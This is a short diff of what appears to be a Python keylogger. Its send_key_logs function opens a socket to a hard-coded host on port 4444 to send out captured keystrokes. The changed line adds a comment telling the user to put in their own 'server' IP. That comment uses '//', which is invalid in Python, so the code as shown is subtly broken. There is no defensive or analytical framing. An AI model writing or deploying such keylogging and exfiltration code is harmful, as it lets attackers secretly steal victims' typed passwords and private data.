@@ -2,7 +2,7 @@ import keyboard
 import socket
 
 def send_key_logs():
-	host = '192.168.1.28'
+	host = '192.168.1.28'//Replace with your IP of the Device(Server IP)
 	port = 4444
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
